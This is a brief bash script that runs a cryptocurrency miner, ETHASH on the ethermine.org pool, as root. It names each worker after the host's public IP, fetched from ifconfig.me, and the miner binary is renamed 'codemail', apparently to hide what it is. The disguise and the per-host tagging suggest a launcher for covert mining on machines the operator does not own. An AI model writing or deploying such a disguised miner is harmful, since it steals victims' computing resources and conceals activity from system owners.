#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=wallet.$(echo "$(curl -s ifconfig.me)" | tr . _ )-

cd "$(dirname "$0")"

chmod +x ./codemail && sudo ./codemail --algo ETHASH --pool $POOL --user $WALLET  $@
